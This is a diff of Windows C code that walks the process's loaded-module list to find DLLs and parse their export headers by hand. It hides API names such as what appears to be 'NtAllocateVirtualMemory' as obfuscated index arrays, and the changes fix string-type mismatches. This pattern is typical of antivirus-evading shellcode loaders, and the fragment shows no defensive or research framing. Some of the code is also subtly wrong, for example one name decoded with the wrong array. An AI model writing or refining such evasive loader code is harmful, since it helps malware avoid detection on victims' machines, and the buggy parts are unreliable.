@@ -111,6 +111,10 @@ cool Getaddress(const char *vv, const wchar_t *vvv) {
     LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
     LIST_ENTRY* entry = moduleList->Flink;
 
+    // Convert moduleName to wide string (since BaseDllName is wide string)
+    wchar_t wModuleName[MAX_PATH];
+    mbstowcs(wModuleName, moduleName, MAX_PATH);
+
     while (entry != moduleList) {
         PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
         entry = entry->Flink;
@@ -119,7 +123,7 @@ cool Getaddress(const char *vv, const wchar_t *vvv) {
         
         wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);
         
-        if (_wcsicmp(module->BaseDllName.Buffer, vvv) == 0) {
+        if (_wcsicmp(module->BaseDllName.Buffer, wModuleName) == 0) {  // Compare with variable
             BYTE* baseAddress = (BYTE*)module->DllBase;
             IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
             IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
@@ -160,11 +164,11 @@ int main(int argc, char* argv[]) {
     //Get a handle to the ntdll.dll library
     //hello
     int ntt[] = {39, 45, 29, 37, 37, 62, 29, 37, 37};
-    const wchar_t* ntd = getoriginal(ntt, big_string, sizeof(ntt));
+    const char* ntd = getoriginal(ntt, big_string, sizeof(ntt));
     HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));
     
     int ws_lld_ker_32[] = {36, 30, 43, 39, 30, 37, 55, 54, 62, 29, 37, 37};
-    const wchar_t* ker32 = getoriginal(ntt, big_string, sizeof(ws_lld_ker_32));
+    const char* ker32 = getoriginal(ntt, big_string, sizeof(ws_lld_ker_32));
     HMODULE istfromKe__ws_ls_32 = GetModuleHandleA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)));
     
     int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
